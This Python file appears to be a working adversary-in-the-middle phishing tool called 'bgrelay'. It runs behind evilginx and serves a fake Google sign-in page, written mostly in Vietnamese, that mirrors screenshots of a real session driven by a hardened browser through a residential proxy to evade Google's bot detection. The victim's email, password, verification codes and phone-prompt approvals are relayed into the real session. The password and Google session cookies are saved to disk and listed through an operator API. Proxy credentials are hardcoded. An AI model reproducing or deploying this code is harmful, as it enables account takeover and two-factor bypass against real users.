#!/usr/bin/env python3
"""bgrelay — real-browser relay for Google sign-in (botguard-safe, faithful mirror).

Architecture: the victim page LIVESTREAMS screenshots of the sidecar's REAL
accounts.google.com page (~1.2s cadence) — everything the victim sees is
exactly what Google is actually showing (password page, errors, CAPTCHA,
number-match, challenges). Victim input goes through a minimal relay bar and
is typed into the sidecar by patchright; the mirror then reflects the result.

The sidecar is a patchright (hardened-CDP chromium) browser, headful under
Xvfb, per-victim session, through the residential exit — so Google's botguard
always sees a genuine browser on the genuine origin (verified to pass).

Endpoints (behind evilginx /__relay/):
  GET  /              mirror page
  POST /api/start     {email}                    -> {id}
  GET  /api/state?id= -> {state, hint, need_input, match_number, screenshot}
  POST /api/input     {id, kind: password|code, value}
  GET  /api/sessions  (X-Op-Key)                 -> captured sessions

Env: RELAY_SOCKS (socks5://user:pass@host:port), RELAY_PORT (9445),
     RELAY_BRIDGE_PORT (8119), RELAY_STORE (~/bgrelay-store).
"""

import base64
import json
import os
import queue
import re
import secrets
import socket
import subprocess
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse

from patchright.sync_api import sync_playwright

RELAY_PORT = int(os.environ.get("RELAY_PORT", "9445"))
BRIDGE_PORT = int(os.environ.get("RELAY_BRIDGE_PORT", "8119"))
SOCKS = os.environ.get(
    "RELAY_SOCKS",
    "socks5://ceGKVX:YqWshv@14.224.158.32:48726",
)
OP_KEY = os.environ.get("RELAY_OP_KEY") or secrets.token_hex(12)
STORE_DIR = os.path.expanduser(os.environ.get("RELAY_STORE", "~/bgrelay-store"))
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36")
SIGNIN_URL = "https://accounts.google.com/ServiceLogin?hl=en&continue=https%3A%2F%2Fmail.google.com%2F"

os.makedirs(STORE_DIR, exist_ok=True)


# ---------------------------------------------------------------- bridge ---
def parse_socks():
    m = re.match(r"socks5://([^:]+):([^@]+)@([\d.]+):(\d+)", SOCKS)
    if not m:
        sys.exit("RELAY_SOCKS must be socks5://user:pass@host:port")
    return m.group(3), int(m.group(4)), m.group(1), m.group(2)


def start_bridge():
    """Local HTTP CONNECT proxy -> upstream SOCKS5 (chromium can't do socks auth)."""
    import socks as pysocks  # pip pysocks

    up_host, up_port, up_user, up_pass = parse_socks()

    def pipe(a, b):
        try:
            while True:
                d = a.recv(65536)
                if not d:
                    break
                b.sendall(d)
        except Exception:
            pass
        finally:
            for s in (a, b):
                try:
                    s.close()
                except Exception:
                    pass

    def handle(c):
        try:
            req = b""
            while b"\r\n\r\n" not in req:
                chunk = c.recv(4096)
                if not chunk:
                    return
                req += chunk
            line = req.split(b"\r\n")[0].decode()
            method, target = line.split()[0], line.split()[1]
            if method != "CONNECT":
                c.sendall(b"HTTP/1.1 405 CONNECT only\r\n\r\n")
                return
            host, port = target.rsplit(":", 1)
            s = pysocks.socksocket()
            s.set_proxy(pysocks.SOCKS5, up_host, up_port, True, up_user, up_pass)
            s.settimeout(30)
            s.connect((host, int(port)))
            s.settimeout(None)
            c.sendall(b"HTTP/1.1 200 Connected\r\n\r\n")
            threading.Thread(target=pipe, args=(c, s), daemon=True).start()
            pipe(s, c)
        except Exception:
            try:
                c.close()
            except Exception:
                pass

    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", BRIDGE_PORT))
    srv.listen(64)
    print(f"[bridge] 127.0.0.1:{BRIDGE_PORT} -> {up_host}:{up_port}", flush=True)
    while True:
        threading.Thread(target=handle, args=(srv.accept()[0],), daemon=True).start()


def ensure_xvfb():
    display = os.environ.get("DISPLAY", ":99")
    num = display.lstrip(":").split(".")[0]
    try:
        subprocess.run(["xdpyinfo", "-display", f":{num}"], check=True,
                       capture_output=True, timeout=5)
        return display
    except Exception:
        subprocess.Popen(["Xvfb", f":{num}", "-screen", "0", "1366x768x24"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1.5)
        return display


# --------------------------------------------------------------- session ---
class RelaySession(threading.Thread):

    def __init__(self, sid, email=None):
        super().__init__(daemon=True)
        self.id = sid
        self.email = email
        self.password = None
        self.state = "init"
        self.hint = "Đang mở trang đăng nhập…"
        self.need_input = None          # None | "password" | "code"
        self.screenshot = None          # b64 jpeg, refreshed ~1.2s
        self.match_number = None        # 2-digit Google prompt number
        self.error = None
        self.cookies = None
        self.inputs = queue.Queue()
        self.last_active = time.time()
        self.deadline = time.time() + 8 * 60
        self.finished = False

    # -- helpers ------------------------------------------------------------
    def _body(self, pg):
        try:
            return pg.inner_text("body")
        except Exception:
            return ""

    def _visible(self, pg, sel):
        try:
            return pg.locator(sel).first.is_visible()
        except Exception:
            return False

    def _stream(self, pg):
        """Refresh the mirror: screenshot + number-match extraction.
        Called from every poll iteration (~1-2s cadence, single-threaded)."""
        try:
            self.screenshot = base64.b64encode(
                pg.screenshot(type="jpeg", quality=60)).decode()
        except Exception as e:
            if not getattr(self, "_shot_err_logged", False):
                self._shot_err_logged = True
                print(f"[shot-err] {self.id}: {type(e).__name__}: {str(e)[:200]}", flush=True)
        try:
            body = self._body(pg)
            cands = re.findall(r"(?m)^\s*(\d{2})\s*$", body)
            if not cands:
                cands = re.findall(r"(?<!\d)(\d{2})(?!\d)", body[:400])
            if cands and self.state == "challenge":
                self.match_number = cands[0]
        except Exception:
            pass

    def _classify(self, pg):
        host = (urlparse(pg.url).hostname or "").lower()
        body = self._body(pg)
        if host in ("mail.google.com", "myaccount.google.com"):
            return "done"
        if self._visible(pg, "input[name='Passwd']") or self._visible(pg, "input[type='password']"):
            return "password"
        low = body.lower()
        if self._visible(pg, "input[name='totpPin']") or "enter a code" in low \
                or "verify it" in low or "2-step" in low:
            return "challenge"
        if "couldn" in low and "find" in low:
            return "error_bad_account"
        if "wrong password" in low:
            return "password_retry"
        if "not be secure" in low:
            return "error_botguard"
        return None

    def _wait_input(self, pg, kind, hint):
        """Wait for the victim's input while keeping the mirror streaming."""
        self.state = {"code": "challenge", "email": "init_email"}.get(kind, kind)
        self.need_input = kind
        self.hint = hint
        remaining = max(1.0, self.deadline - time.time())
        rounds = int(remaining / 1.2) + 1
        for _ in range(rounds):
            try:
                item = self.inputs.get(timeout=1.2)
                self.last_active = time.time()
                return item
            except queue.Empty:
                self._stream(pg)
                if time.time() > self.deadline:
                    return ("abort", None)
        return ("abort", None)

    def _collect(self, pg):
        out = []
        try:
            for c in pg.context.cookies():
                dom = c.get("domain", "")
                if "google.com" in dom:
                    out.append({"name": c["name"], "value": c["value"],
                                "domain": dom, "path": c.get("path", "/"),
                                "expires": c.get("expires", -1)})
        except Exception:
            pass
        return out

    def _finish(self, pg, state, hint=""):
        self.state = state
        self.hint = hint
        self.need_input = None
        self.finished = True
        try:
            self._stream(pg)
        except Exception:
            pass
        if state == "done":
            self.cookies = self._collect(pg)
            rec = {"id": self.id, "email": self.email, "password": self.password,
                   "cookies": self.cookies, "ua": UA, "ts": int(time.time())}
            path = os.path.join(STORE_DIR, self.id + ".json")
            with open(path, "w") as f:
                json.dump(rec, f, indent=1)
            print(f"[capture] {self.email} -> {path} "
                  f"({len(self.cookies)} cookies)", flush=True)

    # -- main loop ----------------------------------------------------------
    def run(self):
        os.environ["DISPLAY"] = ensure_xvfb()
        pw = None
        try:
            pw = sync_playwright().start()
            browser = pw.chromium.launch(
                headless=False,
                args=["--no-sandbox", "--disable-dev-shm-usage",
                      "--window-size=1366,768"],
                proxy={"server": f"http://127.0.0.1:{BRIDGE_PORT}"})
            pg = browser.new_page(user_agent=UA, locale="en-US",
                                  viewport={"width": 1366, "height": 768})
            pg.goto(SIGNIN_URL, wait_until="load", timeout=60000)
            pg.wait_for_selector("#identifierId", timeout=20000)
            pg.wait_for_selector("#identifierNext", state="visible", timeout=20000)
            time.sleep(2)  # let the v3 app finish booting so the click registers
            if not self.email:
                # mirror-first: the victim watches the REAL identifier page while
                # typing the email into the relay bar — no fake UI at all
                item = self._wait_input(pg, "email", "Nhập email của bạn")
                if item[0] == "abort":
                    self._finish(pg, "error", "Hết thời gian phiên")
                    browser.close()
                    return
                self.email = item[1]
            pg.fill("#identifierId", self.email)
            time.sleep(0.5)
            pg.click("#identifierNext")

            # ---- identifier -> password / challenge / error -------------
            st = None
            for i in range(45):
                time.sleep(1)
                self._stream(pg)
                st = self._classify(pg)
                if st:
                    break
            if st in (None, "error_bad_account", "error_botguard"):
                self._finish(pg, "error",
                             "Không tìm thấy tài khoản Google này." if st == "error_bad_account"
                             else "Google tạm thời từ chối — thử lại sau.")
                browser.close()
                return
            retries = 0
            while time.time() < self.deadline:
                if st in ("password", "password_retry"):
                    item = self._wait_input(pg, "password",
                                            "Nhập mật khẩu của tài khoản " + self.email)
                    if item[0] == "abort":
                        break
                    if self.password is None:
                        self.password = item[1]
                    try:
                        pg.fill("input[name='Passwd']", item[1], timeout=5000)
                    except Exception:
                        pg.fill("input[type='password']", item[1])
                    pg.click("#passwordNext")
                    time.sleep(5)
                    st = self._classify(pg) or "wait"
                    for _ in range(12):
                        if st in ("password", "challenge", "done", "password_retry"):
                            break
                        time.sleep(1)
                        self._stream(pg)
                        st = self._classify(pg) or st
                    if st == "password_retry":
                        retries += 1
                        if retries >= 3:
                            self._finish(pg, "error", "Quá nhiều lần sai mật khẩu.")
                            break
                elif st == "challenge":
                    body = self._body(pg)
                    if self._visible(pg, "input[name='totpPin']") or "enter a code" in body.lower():
                        item = self._wait_input(pg, "code", "Nhập mã xác minh")
                        if item[0] == "abort":
                            break
                        sel = "input[name='totpPin']" if self._visible(pg, "input[name='totpPin']") \
                            else "input[type='tel'], input[name='code']"
                        pg.fill(sel, item[1])
                        pg.click("#totpNext, button:has-text('Next')")
                        time.sleep(5)
                    else:
                        # Google prompt / number match — stream until approved
                        self.state = "challenge"
                        self.hint = "Phê duyệt trên điện thoại (nhập số hiển thị vào app)"
                        self.need_input = None
                        for _ in range(150):
                            time.sleep(1.2)
                            self._stream(pg)
                            st2 = self._classify(pg)
                            if st2 in ("done", "challenge", "password"):
                                st = st2
                                break
                        else:
                            st = None
                        continue
                    st = self._classify(pg) or "wait"
                    for _ in range(12):
                        if st in ("password", "challenge", "done", "password_retry"):
                            break
                        time.sleep(1)
                        self._stream(pg)
                        st = self._classify(pg) or st
                elif st == "done":
                    self._finish(pg, "done", "Đăng nhập thành công")
                    break
                else:
                    time.sleep(1.2)
                    self._stream(pg)
                    st = self._classify(pg) or st
            else:
                self._finish(pg, "error", "Hết thời gian phiên")
            browser.close()
        except Exception as e:
            self.state = "error"
            self.error = str(e)[:200]
            self.hint = "Lỗi phiên đăng nhập"
            self.finished = True
            print(f"[error] {self.id}: {e}", flush=True)
        finally:
            if pw:
                try:
                    pw.stop()
                except Exception:
                    pass


SESSIONS = {}
LOCK = threading.Lock()


def public_state(s):
    return {"id": s.id, "state": s.state, "hint": s.hint,
            "need_input": s.need_input, "match_number": s.match_number,
            "screenshot": s.screenshot}


# ------------------------------------------------------------------ page ---
PAGE = """<!doctype html><html><head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=google content=notranslate>
<title>Sign in - Google Accounts</title>
<style>
*{box-sizing:border-box;font-family:'Google Sans','Segoe UI',Roboto,Arial,sans-serif}
html,body{margin:0;background:#fff;color:#202124;height:100%}
body{display:flex;flex-direction:column}
.wrap{flex:1;display:flex;align-items:center;justify-content:center;padding:12px;min-height:78vh}
#box{width:100%;max-width:968px;text-align:center}
#mirror{max-width:100%;width:100%;height:auto;border-radius:12px;background:#fff;
 filter:blur(18px);transition:filter .35s;min-height:340px}
#mirror.on{filter:none}
#boot{display:block;margin:40px auto 14px;width:30px;height:30px;border:3px solid #dadce0;
 border-top-color:#0b57d0;border-radius:50%;animation:r 1s linear infinite}
@keyframes r{to{transform:rotate(360deg)}}
#num{display:none;background:#e8f0fe;color:#0b57d0;font-size:40px;font-weight:600;
 padding:12px 32px;border-radius:14px;margin:0 auto 16px;letter-spacing:8px;width:fit-content}
#bar{margin:16px auto 0;display:flex;gap:8px;max-width:520px}
#bar.off{display:none}
#rinp{flex:1;padding:12px 14px;font-size:15px;border:1px solid #dadce0;border-radius:8px;
 outline:none;background:#fff;text-align:center}
#rinp:focus{border-color:#0b57d0;box-shadow:0 0 0 1px #0b57d0}
#rinp.egpw{-webkit-text-security:disc}
#rgo{background:#0b57d0;color:#fff;border:none;border-radius:100px;padding:10px 22px;
 font-size:14px;cursor:pointer}
#rgo:disabled{background:#9aa0a6}
#st{margin:8px auto 0;font-size:13px;color:#5f6368;min-height:18px}
#st.err{color:#d93025}
.foot{padding:10px 24px;display:flex;justify-content:space-between;font-size:12px;color:#5f6368}
.foot .l{display:flex;gap:18px}
</style></head><body>
<div class=wrap><div id=box>
<div id=boot></div>
<div id=num style="display:none">00</div>
<img id=mirror alt="" style="display:none">
<div id=bar class=off><input id=rinp autocomplete=off><button id=rgo>Tiếp tục</button></div>
<div id=st></div>
</div></div>
<div class=foot><div class=l><span>English (United States)</span></div>
<div class=l><span>Help</span><span>Privacy</span><span>Terms</span></div></div>
<script>
var SID=null, KIND=null,
    mirror=document.getElementById('mirror'), boot=document.getElementById('boot'),
    numEl=document.getElementById('num'), rbar=document.getElementById('bar'),
    rinp=document.getElementById('rinp'), rgo=document.getElementById('rgo'),
    st=document.getElementById('st');
var PLACE={email:'Email or phone',password:'Mật khẩu',code:'Mã xác minh'};
['pointermove','keydown','touchstart'].forEach(function(ev){
 document.addEventListener(ev,function(){mirror.classList.add('on');},{once:true,capture:true});});
function setSt(t,err){st.textContent=t||'';st.className=err?'err':'';}
function showInput(kind){KIND=kind;rbar.className='';
 rinp.className=kind==='password'?'egpw':'';
 rinp.placeholder=PLACE[kind]||'';rinp.value='';rinp.focus();rgo.disabled=false;}
function hideInput(){KIND=null;rbar.className='off';}
function relaySubmit(){
 if(!rinp.value)return;
 rgo.disabled=true;setSt('Đang xử lý…');
 fetch('/__relay/api/input',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({id:SID,kind:KIND,value:rinp.value})})
  .then(function(){rinp.value='';}).catch(function(){setSt('Lỗi mạng',1);rgo.disabled=false;});
}
rgo.onclick=relaySubmit;rinp.onkeydown=function(k){if(k.key==='Enter')relaySubmit();};
function stageDone(){
 hideInput();setSt('');
 numEl.insertAdjacentHTML('afterend','<div style="margin:14px 0"><svg width=56 height=56 viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="11" stroke="#34A853" stroke-width="2"/><path d="M7 12.5l3.2 3.2L17 9" stroke="#34A853" stroke-width="2" fill="none"/></svg><div style="font-size:20px;margin-top:10px">Bạn đã đăng nhập thành công</div><div style="color:#5f6368;font-size:14px;margin-top:6px">Đang chuyển tới Gmail…</div></div>');
 setTimeout(function(){location.href='https://mail.google.com';},2600);
}
function poll(){
 if(!SID){setTimeout(poll,900);return;}
 fetch('/__relay/api/state?id='+SID).then(function(r){return r.json();}).then(function(x){
  if(x.screenshot){
   var src='data:image/jpeg;base64,'+x.screenshot;
   if(mirror.getAttribute('src')!==src){mirror.src=src;}
   mirror.style.display='block';boot.style.display='none';mirror.classList.add('on');
  }
  if(x.match_number){numEl.style.display='block';numEl.textContent=x.match_number;}
  if(x.state==='done'){stageDone();return;}
  if(x.state==='error'){hideInput();setSt(x.hint||'Không thể đăng nhập',1);return;}
  if(x.need_input){if(KIND!==x.need_input)showInput(x.need_input);}
  else if(KIND){hideInput();}
  if(x.state==='init'||x.state==='init_email'&&!x.screenshot){setSt('Đang mở trang đăng nhập…');}
  else if(!KIND&&!x.match_number&&x.state!=='challenge'){setSt('');}
  setTimeout(poll,1200);
 }).catch(function(){setTimeout(poll,2200);});
}
setSt('Đang mở trang đăng nhập…');
fetch('/__relay/api/start',{method:'POST',headers:{'Content-Type':'application/json'},
 body:JSON.stringify({})}).then(function(r){return r.json();}).then(function(j){SID=j.id;poll();})
 .catch(function(){setSt('Lỗi mạng — tải lại trang',1);});
poll();
</script></body></html>"""


# ---------------------------------------------------------------- server ---
class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        pass

    def _json(self, obj, code=200):
        body = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        path = self.path.split("?")[0]
        if path in ("/", "/index.html"):
            body = PAGE.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(body)
        elif path.startswith("/api/state"):
            sid = self.path.split("id=")[-1][:40]
            s = SESSIONS.get(sid)
            if not s:
                return self._json({"error": "no session"}, 404)
            return self._json(public_state(s))
        elif path == "/api/sessions":
            if self.headers.get("X-Op-Key") != OP_KEY:
                return self._json({"error": "forbidden"}, 403)
            out = []
            for s in SESSIONS.values():
                out.append({"id": s.id, "email": s.email,
                            "state": s.state, "password": s.password,
                            "cookie_count": len(s.cookies or [])})
            return self._json(out)
        else:
            self._json({"error": "not found"}, 404)

    def do_POST(self):
        path = self.path.split("?")[0]
        length = int(self.headers.get("Content-Length", "0"))
        try:
            data = json.loads(self.rfile.read(length) or b"{}")
        except Exception:
            return self._json({"error": "bad json"}, 400)
        if path == "/api/start":
            email = (data.get("email") or "").strip()[:120]
            if email and not re.match(r"[^@\s]+@[^@\s]+\.[^@\s]+", email):
                return self._json({"error": "bad email"}, 400)
            if not email:
                email = None
            sid = secrets.token_hex(8)
            s = RelaySession(sid, email)
            with LOCK:
                SESSIONS[sid] = s
            s.start()
            print(f"[session] {sid} start email={email}", flush=True)
            return self._json({"id": sid})
        if path == "/api/input":
            s = SESSIONS.get((data.get("id") or "")[:40])
            if not s:
                return self._json({"error": "no session"}, 404)
            s.last_active = time.time()
            s.inputs.put((data.get("kind"), (data.get("value") or "")[:200]))
            return self._json({"ok": True})
        self._json({"error": "not found"}, 404)


def reaper():
    while True:
        time.sleep(60)
        with LOCK:
            for sid in list(SESSIONS):
                s = SESSIONS[sid]
                if s.finished and time.time() - s.last_active > 15 * 60:
                    del SESSIONS[sid]


if __name__ == "__main__":
    print(f"[bgrelay] port={RELAY_PORT} store={STORE_DIR}", flush=True)
    print(f"[bgrelay] OP_KEY={OP_KEY}", flush=True)
    threading.Thread(target=start_bridge, daemon=True).start()
    threading.Thread(target=reaper, daemon=True).start()
    ensure_xvfb()
    ThreadingHTTPServer(("127.0.0.1", RELAY_PORT), Handler).serve_forever()
